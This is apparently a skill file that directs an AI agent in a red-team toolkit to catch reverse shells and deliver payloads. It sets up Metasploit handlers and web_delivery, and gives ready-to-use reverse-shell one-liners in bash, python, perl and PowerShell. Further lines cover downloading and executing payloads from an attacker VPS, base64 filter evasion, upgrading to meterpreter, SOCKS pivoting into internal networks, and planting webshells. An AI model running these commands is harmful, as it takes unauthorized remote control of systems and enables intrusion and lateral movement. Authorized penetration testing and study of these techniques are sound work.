---
name: shell-handler
description: Reverse shell and payload delivery: start MSF/nc/socat listeners on VPS to receive shells, or have the target actively pull and execute payloads
whenToUse: When you need RCE/command-execution callback, deliver follow-up payloads, or turn one-shot command execution into an interactive session
role: exploit
enabled: true
---

# Reverse shell and payload delivery (obtaining callback sessions)

> **Load VPS configuration first**: all `$REDTEAM_VPS_HOST` / `$VPS_USER` values in this skill come from local configuration,
> written to `$DSH_HOME/.env` on first run by `bash $DSH_HOME/redteam/setup.sh`. Source it once before each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> If not configured yet, run `setup.sh` once (skill `redteam-setup`); it also verifies SSH connectivity and the payload service.

**Command execution ≠ session**. A one-shot `?cmd=whoami` only proves a vuln exists; it does not allow sustained operations. This skill turns "can execute commands"
into a **stable, interactive, reusable** callback session and delivers follow-up payloads (implants, tunnels, scanners).

## Local infrastructure

| Item | Value |
| --- | --- |
| VPS | `$REDTEAM_VPS_HOST` (SSH port 22, key `$DSH_HOME/redteam/toolkit/vps/id_rsa`) |
| Payload distribution | `http://$REDTEAM_VPS_HOST:9100/` (fscan/gogo/Behinder/Godzilla payloads synced) |
| Listener port range | `9000-9999` |
| Session management | `tmux` (listeners must run in tmux; disconnect = loss) |
| Local tools | `nc`, `socat`, `msfconsole` 6.5.3 (`exploit/multi/handler`, `exploit/multi/script/web_delivery` verified available) |

Related skills: `vps-reverse-shell` (VPS login and listener operations), `webshell-toolkit` (deploy Behinder/Godzilla webshells).

## 1. Selection: when to use what

| Scenario | Approach |
| --- | --- |
| **Temporary verification** (just want to run one command and see output) | `nc -lvnp <port>` + bash/python reverse shell on target; sufficient if it works |
| **Long-term operation / file transfer / tunneling** (**primary**) | **MSF `multi/handler`** (auto-reconnect, can upgrade to meterpreter, can open socks) |
| **Target can only reach outbound HTTP(S)** | `web_delivery` (MSF generates a one-liner; target pulls payload) |
| **Windows target, need stability** | MSF handler + upgrade via `shell_to_meterpreter` |
| **Need to proxy intranet traffic back** | After getting shell, **do not** proxy via shell; deploy webshell → `suo5-tunnel` (see skill) |

## 2. MSF handler (recommended primary)

```bash
# 1) Start listener in tmux on VPS (local/VPS both fine depending on callback direction)
tmux new -s handler
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp   # Windows: windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9001
msf6 > set ExitOnSession false      # key: do not exit when session drops, keep waiting for reconnect
msf6 > exploit -j                    # background listener
```

**Before starting listener, confirm port is free**: `ss -lntp | grep 9001`; open the port in VPS security group.

Full chain example (one-shot delivery + receive session):
```bash
# Target side (assuming a command execution point exists)
bash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'
# If bash unavailable, use alternatives (see table below)
```

## 3. One-liner reverse shells by language (choose by target environment)

```bash
# Linux - bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
# Linux - no bash (sh + nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
# Linux - python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Linux - perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Windows - powershell (mind escaping and execution policy)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
# Windows - download payload with certutil then execute
certutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\Windows\Temp\f.exe && C:\Windows\Temp\f.exe -h 10.0.0.0/24
# Linux - download payload with curl/wget
curl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss
```

**Encoding bypass**: if spaces/quotes are filtered, base64-encode and decode:
```bash
# Generate (local)
echo -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0
# Execute on target
echo <BASE64> | base64 -d | bash
```

## 4. MSF web_delivery (when only HTTP outbound is possible)

```bash
msf6 > use exploit/multi/script/web_delivery
msf6 > set target 7              # 7 = Linux Python (run show targets to see list)
msf6 > set payload python/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9002
msf6 > exploit -j
# MSF outputs a one-liner (e.g. python -c "import urllib.request;..."),
# deliver it to the target's command execution point → target pulls payload → session established
```

## 5. Upgrade and maintain

```bash
# Upgrade shell to meterpreter (enables socks, file transfer, privilege escalation)
msf6 > sessions -l
msf6 > sessions -u <id>            # or use post/multi/manage/shell_to_meterpreter

# Open intranet socks proxy via meterpreter
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > exploit -j
# Then point proxychains to 127.0.0.1:1080 to reach intranet
```
> ⚠️ Scoring note: **a proxy only on your own VPS does not count as a tunnel**. Intranet targets reached via meterpreter autoroute count as
> `entry_kind=target-agent` (forwarded through a controlled target process); when registering `redteam_tunnel_add`, you must clearly describe the target-side endpoint.

## 6. Discipline (must follow)

1. **Listeners must run in tmux**: SSH disconnect kills listeners and loses sessions. `tmux new -s handler` / `tmux a -t handler`.
2. **Check port availability first**, open in VPS security group; do not open too many listeners on one machine (use ports sequentially within 9000-9999).
3. **Reverse shell means "target initiates outbound connection"**: if outbound is restricted, try HTTP(S) outbound first (80/443/8080);
   if completely no outbound, you must use webshell + tunnel (`suo5-tunnel`).
4. **Do not run payloads that restart services on production systems**; assess reboot risk before privilege escalation/kernel exploits.
5. **Register sessions**: immediately after obtaining shell, make it usable for `redteam_session_check`; register tunnels via `redteam_tunnel_add`.

## 7. Output and recording (required)

1. **Score immediately upon obtaining callback session**: `redteam_score_hit` (`server-host`), evidence should state "asset | shell type and privilege" (e.g. `10.0.0.5 | root shell (uid=0)`).
2. **Record session**: `redteam_access_add` (`method=reverse-shell`, specify `target`, `user`, `privilege`, listener address and port).
3. **Record tunnel** (if intranet access obtained through it): `redteam_tunnel_add`; `entry_kind` must clearly describe the target-side endpoint
   (`target-outbound` = target callback/target runs frp client, `target-http` = suo5 via target webshell, `target-agent` = forwarded through controlled target process),
   then verify connectivity with `redteam_session_check`.
4. For each key action, add `redteam_chain_add`: `stage_code=internet` (internet-side access) / `boundary` (tunnel setup) / `internal`,
   put **actual command text** in `tool` (including full reverse command or MSF config), and output summary in `result` (e.g. `uid=0(root) gid=0(root)`).
5. **Deliver a reusable entry point to the user**: prefer deploying **Behinder/Godzilla webshells** (skill `webshell-toolkit`)—user can operate directly in the console;
   temporary reverse sessions must be noted as "one-time session, not a delivery entry point".
